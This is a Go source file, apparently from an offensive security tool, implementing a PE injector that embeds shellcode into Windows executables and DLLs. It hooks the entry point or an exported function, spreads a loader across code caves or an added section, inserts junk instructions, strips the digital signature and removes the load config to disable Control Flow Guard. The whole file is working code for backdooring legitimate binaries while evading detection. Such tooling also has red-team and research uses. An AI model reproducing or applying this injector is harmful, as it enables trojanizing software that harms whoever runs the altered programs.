package injector

import (
	"bytes"
	cr "crypto/rand"
	"debug/pe"
	"encoding/binary"
	"errors"
	"fmt"
	"math/rand"
	"strings"
	"time"

	"github.com/For-ACGN/go-keystone"
	"golang.org/x/arch/x86/x86asm"
)

// support modes:
//
// 1. code cave
// The loader and shellcode body are all injected to code caves.
// It will only change the .text section.
//
// 2. extend section
// The loader is injected to code caves.
// The shellcode body is injected to the last section(extended).
// It will change the .text section, adjust the last section
// header and the OptionalHeader.SizeOfImage
//
// 3. create section
// The loader and shellcode body are all injected to a new section.
// It will change the .text section, create a new section, adjust
// the FileHeader.NumberOfSections and OptionalHeader.SizeOfImage
//
// All the modes will not adjust the size of .text section.

// these modes are used to display the mode that injector used.
const (
	ModeCodeCave      = "code-cave"
	ModeExtendSection = "extend-section"
	ModeCreateSection = "create-section"
)

var (
	// imageBaseStub is used to mark the offset of the image base.
	imageBaseStub = []byte{0x20, 0x25, 0x08, 0x21}

	// endOfShellcode is used to mark the end of shellcode.
	// NOP DWORD ptr [EAX + EAX*1 + 00]
	endOfShellcode = []byte{0x0F, 0x1F, 0x44, 0x00, 0x00}
)

// Injector is a simple PE injector for inject shellcode.
type Injector struct {
	rand *rand.Rand

	// assembler engine
	engine *keystone.Engine

	// context arguments
	raw  bool
	ctx  *Context
	opts *Options
	arch string
	dll  bool
	size uint32
	abs  bool
	dup  []byte

	// about pe image
	img   *pe.File
	hdr32 *pe.OptionalHeader32
	hdr64 *pe.OptionalHeader64

	// about image alignment
	sectionAlign uint32
	fileAlign    uint32

	// about data directory
	numDataDir uint32
	dataDir    [16]pe.DataDirectory

	// common offset of image file
	offFileHdr uint32
	offOptHdr  uint32
	offDataDir uint32

	// restore before remove
	containSign bool
	containCFG  bool

	// about process EAT and IAT
	eat []*eat
	iat []*iat

	// try to extend text section
	canTryExtend bool

	// about create section mode
	section *pe.SectionHeader

	// about hook function
	oriInst [][]byte
	retRVA  uint32

	// about relocated shellcode
	segment    [][]byte
	contextSeq []int
	ccList     []*codeCave

	// for write shellcode segment
	caves []*codeCave

	// for select random register
	regBox []string
}

// Options contains options about inject shellcode.
type Options struct {
	// specify the target function address that will
	// be hooked, it is an VA address, not a file offset
	// or RVA, remember disable ASLR when debug image.
	// if it is zero, use the entry point.
	Address uint64 `toml:"address" json:"address"`

	// specify the target function in EAT that will
	// be hooked, it not support forwarded.
	// the hook target is usually not at the beginning
	// of the function.
	Function string `toml:"function" json:"function"`

	// not select a random instruction after target address that can be hooked.
	// when Address is set or NotSaveContext, it will be ignored.
	NotHookInstruction bool `toml:"not_hook_instruction" json:"not_hook_instruction"`

	// not append instruction about save and restore context.
	// if your shellcode need hijack function argument or
	// register, you need set it with true.
	NotSaveContext bool `toml:"not_save_context" json:"not_save_context"`

	// not create thread at the shellcode,
	// ensure the shellcode can be called as a function.
	// on x86, the calling convention is stdcall.
	// if it is true, it will ignore the option NotWaitThread.
	// it is useless for method InjectRaw.
	NotCreateThread bool `toml:"not_create_thread" json:"not_create_thread"`

	// not wait created thread at the shellcode,
	// if it is true, it will ignore the option NotEraseShellcode.
	// it is useless for method InjectRaw.
	NotWaitThread bool `toml:"not_wait_thread" json:"not_wait_thread"`

	// not erase shellcode after execute finish.
	// when you need run shellcode as a background
	// program, you need set it with true.
	// it is useless for method InjectRaw.
	NotEraseShellcode bool `toml:"not_erase_shellcode" json:"not_erase_shellcode"`

	// not add a shellcode jumper to call shellcode.
	// it is useless for method InjectRaw.
	NoShellcodeJumper bool `toml:"no_shellcode_jumper" json:"no_shellcode_jumper"`

	// not append garbage instruction to loader.
	// It is only for Inject with ModeCreateSection.
	NoGarbage bool `toml:"no_garbage" json:"no_garbage"`

	// reserve load config directory for enable Control Flow Guard.
	ReserveCFG bool `toml:"reserve_cfg" json:"reserve_cfg"`

	// specify the new section name, the default is ".patch".
	SectionName string `toml:"section_name" json:"section_name"`

	// specify a random seed for test and debug.
	RandSeed int64 `toml:"rand_seed" json:"rand_seed"`

	// force use code cave mode for write shellcode.
	// if code cave is not enough, it will return an error.
	ForceCodeCave bool `toml:"force_code_cave" json:"force_code_cave"`

	// force extend the last section even if the number
	// of code cave is enough for write shellcode.
	// it is useless for method InjectRaw.
	ForceExtendSection bool `toml:"force_extend_section" json:"force_extend_section"`

	// force create a new section after the last section
	// for write loader and shellcode.
	ForceCreateSection bool `toml:"force_create_section" json:"force_create_section"`

	// specify the x86 loader template.
	LoaderX86 string `toml:"loader_x86" json:"loader_x86"`

	// specify the x64 loader template.
	LoaderX64 string `toml:"loader_x64" json:"loader_x64"`

	// specify the x86 junk code templates.
	JunkCodeX86 []string `toml:"junk_code_x86" json:"junk_code_x86"`

	// specify the x64 junk code templates.
	JunkCodeX64 []string `toml:"junk_code_x64" json:"junk_code_x64"`

	// specify highly customizable loader template.
	Template *Template `toml:"template" json:"template"`
}

// Context contains the output and context data in Inject and InjectRaw.
type Context struct {
	Output []byte `json:"output"`

	Hook []string `json:"hook"`

	LoaderHex  string `json:"loader_hex"`
	LoaderInst string `json:"loader_inst"`

	Arch  string `json:"arch"`
	Mode  string `json:"mode"`
	IsDLL bool   `json:"is_dll"`
	IsRaw bool   `json:"is_raw"`
	Seed  int64  `json:"seed"`

	SaveContext     bool   `json:"save_context"`
	CreateThread    bool   `json:"create_thread"`
	WaitThread      bool   `json:"wait_thread"`
	EraseShellcode  bool   `json:"erase_shellcode"`
	ShellcodeJumper bool   `json:"shellcode_jumper"`
	HasGarbage      bool   `json:"has_garbage"`
	SectionName     string `json:"section_name"`

	HasAllProcedures       bool `json:"has_all_procedures"`
	HasVirtualAlloc        bool `json:"has_virtual_alloc"`
	HasVirtualFree         bool `json:"has_virtual_free"`
	HasVirtualProtect      bool `json:"has_virtual_protect"`
	HasCreateThread        bool `json:"has_create_thread"`
	HasWaitForSingleObject bool `json:"has_wait_for_single_object"`
	HasLoadLibraryA        bool `json:"has_load_library_a"`
	HasLoadLibraryW        bool `json:"has_load_library_w"`
	HasGetProcAddress      bool `json:"has_get_proc_address"`

	NumCodeCaves  int    `json:"num_code_caves"`
	NumLoaderInst int    `json:"num_loader_inst"`
	HookAddress   uint64 `json:"hook_address"`
}

// NewInjector is used to create a simple PE injector.
func NewInjector() *Injector {
	var seed int64
	buf := make([]byte, 8)
	_, err := cr.Read(buf)
	if err == nil {
		seed = int64(binary.LittleEndian.Uint64(buf)) // #nosec G115
	} else {
		seed = time.Now().UTC().UnixNano()
	}
	injector := Injector{
		rand: rand.New(rand.NewSource(seed)), // #nosec
	}
	return &injector
}

// Inject is used to inject payload to a PE image file.
// It will inject a payload loader to code cave,
// loader will decrypt and execute the input payload.
func (inj *Injector) Inject(image, payload []byte, opts *Options) (*Context, error) {
	if len(payload) == 0 {
		return nil, errors.New("empty payload")
	}
	defer inj.cleanup()
	err := inj.preprocess(image, opts)
	if err != nil {
		return nil, err
	}
	// initialize keystone engine
	err = inj.initAssembler()
	if err != nil {
		return nil, fmt.Errorf("failed to initialize assembler: %s", err)
	}
	defer func() {
		_ = inj.engine.Close()
		inj.engine = nil
	}()
	// set method flag
	inj.raw = false
	loader, err := inj.buildLoader(payload)
	if err != nil {
		return nil, fmt.Errorf("failed to build loader: %s", err)
	}
	err = inj.inject(loader, false)
	if err != nil {
		return nil, fmt.Errorf("failed to inject loader: %s", err)
	}
	inj.overwriteChecksum()
	inj.ctx.Output = inj.dup
	// record loader assembly
	binHex, insts := inj.disassembleLoader(loader)
	inj.ctx.LoaderHex = binHex
	inj.ctx.LoaderInst = insts
	return inj.ctx, nil
}

// InjectRaw is used to inject shellcode to a PE image without loader.
// It is an advanced usage, ensure the shellcode not contains behavior
// like read data from the shellcode tail.
// Must use "nop 5" for set a flag that define the end of shellcode.
func (inj *Injector) InjectRaw(image []byte, shellcode []byte, opts *Options) (*Context, error) {
	if len(shellcode) == 0 {
		return nil, errors.New("empty shellcode")
	}
	defer inj.cleanup()
	err := inj.preprocess(image, opts)
	if err != nil {
		return nil, err
	}
	// initialize keystone engine
	err = inj.initAssembler()
	if err != nil {
		return nil, fmt.Errorf("failed to initialize assembler: %s", err)
	}
	defer func() {
		_ = inj.engine.Close()
		inj.engine = nil
	}()
	// set method flag
	inj.raw = true
	// auto append the mark about end of shellcode
	shellcode = bytes.Clone(shellcode)
	shellcode = append(shellcode, endOfShellcode...)
	// prepare force inject mode
	opts = inj.opts
	if opts.ForceCodeCave && opts.ForceCreateSection {
		return nil, errors.New("invalid force mode with shellcode source")
	}
	if opts.ForceCreateSection {
		err = inj.createSectionForRaw(len(shellcode))
		if err != nil {
			return nil, err
		}
	}
	err = inj.inject(shellcode, true)
	if err != nil {
		return nil, fmt.Errorf("failed to inject shellcode: %s", err)
	}
	inj.overwriteChecksum()
	inj.ctx.Output = inj.dup
	return inj.ctx, nil
}

// ExtendTextSection is used to try to extend text section.
func (inj *Injector) ExtendTextSection(image []byte, size uint32) ([]byte, error) {
	if size == 0 {
		return bytes.Clone(image), nil
	}
	defer inj.cleanup()
	err := inj.preprocess(image, nil)
	if err != nil {
		return nil, err
	}
	output, err := inj.extendTextSection(size)
	if err != nil {
		return nil, err
	}
	// preprocess again for overwrite checksum
	err = inj.preprocess(output, nil)
	if err != nil {
		return nil, err
	}
	inj.overwriteChecksum()
	return inj.dup, nil
}

func (inj *Injector) inject(shellcode []byte, raw bool) (err error) {
	defer func() {
		if r := recover(); r != nil {
			err = errors.New(fmt.Sprint(r))
		}
	}()
	target, err := inj.selectHookTarget()
	if err != nil {
		return err
	}
	if target == 0 {
		return errors.New("hook target function address is zero")
	}
	instFOA := inj.selectHookInstruction(inj.rvaToFOA(target)) // TODO confused!!!!
	target = inj.foaToRVA(instFOA)                             // #nosec G115
	first := inj.selectFirstCodeCave(target)
	var dstRVA uint32
	if inj.section != nil {
		dstRVA = inj.section.VirtualAddress
	} else {
		if first == nil {
			return errors.New("not enough code caves for inject shellcode")
		}
		dstRVA = first.virtualAddr
	}
	err = inj.hook(target, dstRVA)
	if err != nil {
		return fmt.Errorf("failed to hook target function: %s", err)
	}
	err = inj.slice(shellcode)
	if err != nil {
		return err
	}
	if inj.section != nil {
		inj.ctx.Mode = ModeCreateSection
		inj.padding(shellcode, target)
		return nil
	}
	if !raw {
		return inj.insert(target, first)
	}
	// try to cove cave mode
	inj.ctx.Mode = ModeCodeCave
	err = inj.insert(target, first)
	if err == nil {
		return nil
	}
	if inj.opts.ForceCodeCave {
		return err
	}
	inj.ctx.Mode = ModeCreateSection
	// if failed, try to use create section mode
	err = inj.createSectionForRaw(len(shellcode))
	if err != nil {
		return err
	}
	inj.padding(shellcode, target)
	return nil
}

func (inj *Injector) initAssembler() error {
	var err error
	switch inj.arch {
	case "386":
		inj.engine, err = keystone.NewEngine(keystone.ARCH_X86, keystone.MODE_32)
	case "amd64":
		inj.engine, err = keystone.NewEngine(keystone.ARCH_X86, keystone.MODE_64)
	}
	if err != nil {
		return err
	}
	return inj.engine.Option(keystone.OPT_SYNTAX, keystone.OPT_SYNTAX_INTEL)
}

func (inj *Injector) assemble(src string) ([]byte, error) {
	if strings.Contains(src, "<no value>") {
		return nil, errors.New("invalid register in assembly source")
	}
	if strings.Contains(src, "<nil>") {
		return nil, errors.New("invalid usage in assembly source")
	}
	return inj.engine.Assemble(src, 0)
}

func (inj *Injector) preprocess(image []byte, opts *Options) error {
	if opts == nil {
		opts = new(Options)
	}
	inj.opts = opts
	// parse pe image file
	peFile, err := pe.NewFile(bytes.NewReader(image))
	if err != nil {
		return err
	}
	// check is an executable image
	if peFile.Characteristics&pe.IMAGE_FILE_EXECUTABLE_IMAGE == 0 {
		return errors.New("not executable image")
	}
	// read image information
	isDLL := peFile.Characteristics&pe.IMAGE_FILE_DLL != 0
	var arch string
	switch peFile.Machine {
	case pe.IMAGE_FILE_MACHINE_I386:
		arch = "386"
		inj.hdr32 = peFile.OptionalHeader.(*pe.OptionalHeader32)
		inj.sectionAlign = inj.hdr32.SectionAlignment
		inj.fileAlign = inj.hdr32.FileAlignment
		inj.numDataDir = inj.hdr32.NumberOfRvaAndSizes
		inj.dataDir = inj.hdr32.DataDirectory
	case pe.IMAGE_FILE_MACHINE_AMD64:
		arch = "amd64"
		inj.hdr64 = peFile.OptionalHeader.(*pe.OptionalHeader64)
		inj.sectionAlign = inj.hdr64.SectionAlignment
		inj.fileAlign = inj.hdr64.FileAlignment
		inj.numDataDir = inj.hdr64.NumberOfRvaAndSizes
		inj.dataDir = inj.hdr64.DataDirectory
	default:
		return errors.New("unknown pe image architecture type")
	}
	inj.img = peFile
	inj.arch = arch
	inj.size = uint32(len(image)) // #nosec G115
	inj.dll = isDLL
	// calculate common offset of image file
	hdrOffset := binary.LittleEndian.Uint32(image[imageDOSHeader-4:])
	fileHeader := hdrOffset + imageNTSignatureSize
	optHeader := fileHeader + imageFileHeaderSize
	var optHeaderSize uint32
	switch inj.arch {
	case "386":
		optHeaderSize = imageOptionHeaderSize32
	case "amd64":
		optHeaderSize = imageOptionHeaderSize64
	}
	ddOffset := optHeader + optHeaderSize
	inj.offFileHdr = fileHeader
	inj.offOptHdr = optHeader
	inj.offDataDir = ddOffset
	err = inj.checkOptionConflict(opts)
	if err != nil {
		return err
	}
	// make duplicate for make output image
	inj.dup = bytes.Clone(image)
	// load image basic information
	err = inj.loadImage()
	if err != nil {
		return fmt.Errorf("failed to load image: %s", err)
	}
	// scan code cave in image text section
	caves, err := inj.scanCodeCave()
	if err != nil {
		return fmt.Errorf("failed to scan code cave: %s", err)
	}
	inj.caves = caves
	// remove the digital signature of the PE file
	inj.removeSignature()
	// remove the load config for disable Control Flow Guard
	inj.removeLoadConfig()
	// set random seed
	seed := opts.RandSeed
	if seed == 0 {
		seed = inj.rand.Int63()
	}
	inj.rand.Seed(seed)
	// update context
	inj.ctx = &Context{
		Arch:  arch,
		IsDLL: isDLL,
		Seed:  seed,

		SaveContext:  !opts.NotSaveContext,
		CreateThread: !opts.NotCreateThread,
		HasGarbage:   !opts.NoGarbage,

		NumCodeCaves: len(caves),
	}
	return nil
}

func (inj *Injector) checkOptionConflict(opts *Options) error {
	if opts.Address != 0 && opts.Function != "" {
		return errors.New("both Address and Function are specified")
	}
	if opts.ReserveCFG && !opts.NotCreateThread && !opts.NoShellcodeJumper {
		return errors.New("cannot create thread with shellcode jumper when reserve CFG")
	}
	return nil
}

func (inj *Injector) selectHookTarget() (uint32, error) {
	address := inj.opts.Address
	if address != 0 {
		inj.abs = true
		return inj.vaToRVA(address), nil
	}
	function := inj.opts.Function
	if function != "" {
		for _, eat := range inj.eat {
			if eat.proc == function {
				return eat.rva, nil
			}
		}
		return 0, fmt.Errorf("failed to find export function: %s", function)
	}
	if inj.dll {
		return 0, errors.New("must specify field Address or Function in DLL")
	}
	var entryPoint uint32
	switch inj.arch {
	case "386":
		entryPoint = inj.hdr32.AddressOfEntryPoint
	case "amd64":
		entryPoint = inj.hdr64.AddressOfEntryPoint
	}
	return entryPoint, nil
}

//gocyclo:ignore
func (inj *Injector) selectHookInstruction(foa uint32) uint32 {
	if inj.abs || inj.opts.NotHookInstruction || inj.opts.NotSaveContext {
		return foa
	}
	// select a random instruction that can be hooked.
	idx := 4 + inj.rand.Intn(40)
	target := foa
	for i := 0; i < 50; i++ {
		if foa+32 > inj.size {
			break
		}
		inst, err := inj.decodeInst(inj.dup[foa : foa+32])
		if err != nil {
			break
		}
		// skip too small instructions for debug easily
		if inst.Len < nearJumpSize {
			foa += uint32(inst.Len)
			continue
		}
		// skip mov instruction for skip absolute address on x86
		if inst.Op == x86asm.MOV {
			foa += uint32(inst.Len)
			continue
		}
		// walk into the next instruction
		if inst.Op == x86asm.JMP {
			foa += uint32(inst.Len + int(inst.Args[0].(x86asm.Rel))) // #nosec G115
			continue
		}
		if inst.Op == x86asm.RET || inst.Op == x86asm.INT {
			break
		}
		// stop when reach a judgement jump
		if inst.PCRelOff != 0 {
			if inst.Op != x86asm.CALL {
				break
			}
			if inst.Len != 5 {
				break
			}
		}
		// set preselected target
		target = foa
		if i >= idx {
			break
		}
		// decode next instruction
		foa += uint32(inst.Len)
	}
	return target
}

// selectFirstCodeCave will try to search a cave near the target RVA.
func (inj *Injector) selectFirstCodeCave(target uint32) *codeCave {
	var first *codeCave
	for i, cave := range inj.caves {
		offset := int64(cave.virtualAddr) - int64(target)
		if offset <= 4096 && offset >= -4096 {
			first = cave
			inj.removeCodeCave(i)
			break
		}
	}
	// if failed to search target, random select a cave
	if first == nil && len(inj.caves) > 0 {
		i := inj.rand.Intn(len(inj.caves))
		first = inj.caves[i]
		inj.removeCodeCave(i)
	}
	return first
}

// hook target function for add a jmp to the first code cave
// #nosec G115
func (inj *Injector) hook(srcRVA uint32, dstRVA uint32) error {
	foa := inj.rvaToFOA(srcRVA)
	if foa+32 > inj.size {
		return errors.New("hook target is overflow")
	}
	insts, _ := inj.disassemble(inj.dup[foa : foa+32])
	numInst, totalSize, err := inj.calcInstNumAndSize(insts)
	if err != nil {
		return err
	}
	// backup original instruction that will be hooked
	var off uint32
	original := make([][]byte, numInst)
	for i := 0; i < numInst; i++ {
		original[i] = make([]byte, insts[i].Len)
		copy(original[i], inj.dup[foa+off:])
		off += uint32(insts[i].Len)
	}
	inj.oriInst = original
	// record the next instruction rva
	inj.retRVA = srcRVA + uint32(totalSize)
	// build a patch for jump to the first code cave
	jmp := make([]byte, nearJumpSize)
	jmp[0] = 0xE9
	rel := int64(dstRVA) - int64(srcRVA) - nearJumpSize
	binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
	padding := bytes.Repeat([]byte{0xCC}, totalSize-nearJumpSize)
	patch := make([]byte, 0, totalSize)
	patch = append(patch, jmp...)
	patch = append(patch, padding...)
	copy(inj.dup[foa:], patch)
	// update context
	inj.ctx.HookAddress = inj.rvaToVA(srcRVA)
	return nil
}

// calcInstNumAndSize is used to calculate the instruction number
// and the total size that will be overwritten.
func (inj *Injector) calcInstNumAndSize(insts []*x86asm.Inst) (int, int, error) {
	var (
		num  int
		size int
	)
	for i := 0; i < len(insts); i++ {
		hook := strings.ToLower(insts[i].String())
		inj.ctx.Hook = append(inj.ctx.Hook, hook)
		num++
		size += insts[i].Len
		if size >= nearJumpSize {
			return num, size, nil
		}
	}
	return 0, 0, errors.New("unable to insert near jmp to this address")
}

// slice will disassemble shellcode and return a slice of instruction segment.
func (inj *Injector) slice(shellcode []byte) error {
	insts, err := inj.disassemble(shellcode)
	if err != nil {
		return fmt.Errorf("failed to disassemble shellcode: %s", err)
	}
	var off int
	segments := make([][]byte, len(insts))
	for i := 0; i < len(insts); i++ {
		l := insts[i].Len
		segments[i] = make([]byte, l)
		copy(segments[i], shellcode[off:])
		off += l
	}
	inj.segment = segments
	// update context
	if !inj.raw {
		inj.ctx.NumLoaderInst = len(segments)
	}
	inj.ctx.IsRaw = inj.raw
	return nil
}

// insert shellcode segment and the patched instruction to code caves.
// #nosec G115
func (inj *Injector) insert(targetRVA uint32, first *codeCave) error {
	var (
		saveContext    [][]byte
		restoreContext [][]byte
	)
	if !inj.opts.NotSaveContext {
		saveContext = inj.saveContext()
		restoreContext = inj.restoreContext()
	}
	num := len(saveContext) + len(restoreContext) + len(inj.segment) + len(inj.oriInst) + 4
	if num > len(inj.caves) {
		return errors.New("not enough code caves to inject shellcode")
	}
	current := first
	next := inj.selectCodeCave()
	// insert instruction about save context
	for i := 0; i < len(saveContext); i++ {
		inst := saveContext[i]
		size := uint32(len(inst))
		// build jmp instruction to next code cave
		rel := int64(next.virtualAddr) - int64(current.virtualAddr+size) - nearJumpSize
		jmp := make([]byte, nearJumpSize)
		jmp[0] = 0xE9
		binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
		rebuild := append([]byte{}, inst...)
		rebuild = append(rebuild, jmp...)
		current.Write(inj.dup, rebuild)
		// update status
		current = next
		next = inj.selectCodeCave()
	}
	// generate code cave list before insert for relocate instruction
	type item struct {
		current *codeCave
		next    *codeCave
	}
	list := make([]*item, len(inj.segment))
	ccLi := make([]*codeCave, len(inj.segment))
	for i := 0; i < len(inj.segment); i++ {
		list[i] = &item{
			current: current,
			next:    next,
		}
		ccLi[i] = current
		// update status
		current = next
		next = inj.selectCodeCave()
	}
	inj.ccList = ccLi
	// insert shellcode segment
	for i := 0; i < len(inj.segment); i++ {
		c := list[i].current
		n := list[i].next
		segment := inj.relocateSegment(inj.segment[i], i, c)
		size := uint32(len(segment))
		if size+nearJumpSize > uint32(c.size) {
			return errors.New("appear too large instruction in shellcode")
		}
		// check it is contained the image base stub
		if bytes.Contains(segment, imageBaseStub) {
			addr := ccLi[i-2].virtualAddr + 5
			buf := make([]byte, 4)
			binary.LittleEndian.PutUint32(buf, addr)
			segment = bytes.ReplaceAll(segment, imageBaseStub, buf)
		}
		// check it is the end of the shellcode
		if bytes.Equal(segment, endOfShellcode) {
			rel := int64(current.virtualAddr) - int64(c.virtualAddr) - nearJumpSize
			jmp := make([]byte, nearJumpSize)
			jmp[0] = 0xE9
			binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
			c.Write(inj.dup, jmp)
			continue
		}
		// build jmp instruction to next code cave
		rel := int64(n.virtualAddr) - int64(c.virtualAddr+size) - nearJumpSize
		jmp := make([]byte, nearJumpSize)
		jmp[0] = 0xE9
		binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
		rebuild := append([]byte{}, segment...)
		rebuild = append(rebuild, jmp...)
		c.Write(inj.dup, rebuild)
	}
	// insert instruction about restore context
	for i := 0; i < len(restoreContext); i++ {
		inst := restoreContext[i]
		size := uint32(len(inst))
		// build jmp instruction to next code cave
		rel := int64(next.virtualAddr) - int64(current.virtualAddr+size) - nearJumpSize
		jmp := make([]byte, nearJumpSize)
		jmp[0] = 0xE9
		binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
		rebuild := append([]byte{}, inst...)
		rebuild = append(rebuild, jmp...)
		current.Write(inj.dup, rebuild)
		// update status
		current = next
		next = inj.selectCodeCave()
	}
	// insert original instruction about patch
	var offTarget uint32
	for i := 0; i < len(inj.oriInst); i++ {
		inst := inj.extendInstruction(nil, inj.oriInst[i])
		size := uint32(len(inst))
		if size+nearJumpSize > uint32(current.size) {
			return errors.New("appear too large original instruction in patch")
		}
		// relocate instruction
		offset := int64(current.virtualAddr) - int64(targetRVA+offTarget)
		inst = inj.relocateInstruction(inst, offset)
		// build jmp instruction to next code cave or original instruction
		var rel int64
		if i != len(inj.oriInst)-1 {
			rel = int64(next.virtualAddr) - int64(current.virtualAddr+size) - nearJumpSize
		} else {
			rel = int64(inj.retRVA) - int64(current.virtualAddr+size) - nearJumpSize
		}
		jmp := make([]byte, nearJumpSize)
		jmp[0] = 0xE9
		binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
		rebuild := append([]byte{}, inst...)
		rebuild = append(rebuild, jmp...)
		current.Write(inj.dup, rebuild)
		// update status
		current = next
		next = inj.selectCodeCave()
		offTarget += uint32(len(inj.oriInst[i]))
	}
	return nil
}

// relocate shellcode instruction segment if it has PC-relative address.
// #nosec G115
func (inj *Injector) relocateSegment(segment []byte, idx int, current *codeCave) []byte {
	inst, err := inj.decodeInst(segment)
	if err != nil {
		panic(err)
	}
	if inst.PCRel == 0 {
		return segment
	}
	switch inst.Args[0].(type) {
	case x86asm.Rel:
	default:
		return segment
	}
	// calculate the target instruction in original shellcode
	var direction bool // true is after PC
	rel := int32(inst.Args[0].(x86asm.Rel))
	if rel >= 0 {
		direction = true
	}
	var (
		off int32
		dst int
	)
	if direction {
		for j := idx + 1; j < len(inj.segment); j++ {
			if off == rel {
				dst = j
				break
			}
			off += int32(len(inj.segment[j]))
		}
	} else {
		off += int32(inst.Len)
		for j := idx; j >= 0; j-- {
			if -off == rel {
				dst = j
				break
			}
			off += int32(len(inj.segment[j-1]))
		}
	}
	// extend instruction segment and decode
	segment = inj.extendInstruction(inst, segment)
	inst, err = inj.decodeInst(segment)
	if err != nil {
		panic(err)
	}
	// calculate the two code cave offset
	vDst := int64(inj.ccList[dst].virtualAddr)
	vSrc := int64(current.virtualAddr + uint32(inst.Len))
	offset := vSrc - vDst + int64(rel)
	// calculate the last offset and relocate instruction
	return inj.relocateInstruction(segment, offset)
}

func (inj *Injector) selectCodeCave() *codeCave {
	i := inj.rand.Intn(len(inj.caves))
	cave := inj.caves[i]
	inj.removeCodeCave(i)
	return cave
}

func (inj *Injector) removeCodeCave(i int) {
	inj.caves = append(inj.caves[:i], inj.caves[i+1:]...)
}

func (inj *Injector) createSectionForRaw(size int) error {
	if !inj.opts.NotSaveContext {
		size += 1024
	}
	section, err := inj.createSection(inj.opts.SectionName, uint32(size)) // #nosec G115
	if err != nil {
		return err
	}
	inj.section = section
	return nil
}

// padding is used to padding shellcode to the created section.
// #nosec G115
func (inj *Injector) padding(shellcode []byte, targetRVA uint32) {
	var (
		saveContext    []byte
		restoreContext []byte
	)
	if !inj.opts.NotSaveContext {
		saveContext = mergeBytes(inj.saveContext())
		restoreContext = mergeBytes(inj.restoreContext())
	}
	var oriInstOffset uint32
	oriInstOffset += uint32(len(saveContext))
	oriInstOffset += uint32(len(shellcode))
	oriInstOffset += uint32(len(restoreContext))
	// build final instructions
	insts := bytes.NewBuffer(make([]byte, 0, len(shellcode)+64))
	// replace the end of shellcode to jmp to the tail of shellcode
	insts.Write(saveContext)
	var scLen uint32
	for i := 0; i < len(inj.segment); i++ {
		segment := inj.segment[i]
		// check it is contained the image base stub
		if bytes.Contains(segment, imageBaseStub) {
			addr := inj.section.VirtualAddress + uint32(len(saveContext)) + scLen
			addr -= uint32(len(inj.segment[i-1]))
			buf := make([]byte, 4)
			binary.LittleEndian.PutUint32(buf, addr)
			segment = bytes.ReplaceAll(segment, imageBaseStub, buf)
		}
		// check it is the end of the shellcode
		if !bytes.Equal(segment, endOfShellcode) {
			insts.Write(segment)
			scLen += uint32(len(segment))
			continue
		}
		offset := uint32(len(shellcode)) - scLen
		rel := offset - nearJumpSize
		jmp := make([]byte, nearJumpSize)
		jmp[0] = 0xE9
		binary.LittleEndian.PutUint32(jmp[1:], rel)
		insts.Write(jmp)
	}
	insts.Write(restoreContext)
	// write hooked original instruction
	var (
		offTarget uint32
		offInst   uint32
	)
	for i := 0; i < len(inj.oriInst); i++ {
		inst := inj.extendInstruction(nil, inj.oriInst[i])
		// relocate instruction
		current := int64(inj.section.VirtualAddress + oriInstOffset + offInst)
		offset := current - int64(targetRVA+offTarget)
		inst = inj.relocateInstruction(inst, offset)
		insts.Write(inst)
		offTarget += uint32(len(inj.oriInst[i]))
		offInst += uint32(len(inst))
	}
	// write jmp to the next original instruction
	offset := inj.section.VirtualAddress + oriInstOffset + offInst
	rel := int64(inj.retRVA) - int64(offset) - nearJumpSize
	jmp := make([]byte, nearJumpSize)
	jmp[0] = 0xE9
	binary.LittleEndian.PutUint32(jmp[1:], uint32(rel))
	insts.Write(jmp)
	// write shellcode loader
	copy(inj.dup[inj.section.Offset:], insts.Bytes())
}

func mergeBytes(b [][]byte) []byte {
	var o []byte
	for i := 0; i < len(b); i++ {
		o = append(o, b[i]...)
	}
	return o
}

func (inj *Injector) cleanup() {
	rd := inj.rand
	n := Injector{
		rand: rd,
	}
	*inj = n
}

// Close is used to close pe injector.
func (inj *Injector) Close() error {
	if inj.engine == nil {
		return nil
	}
	return inj.engine.Close()
}
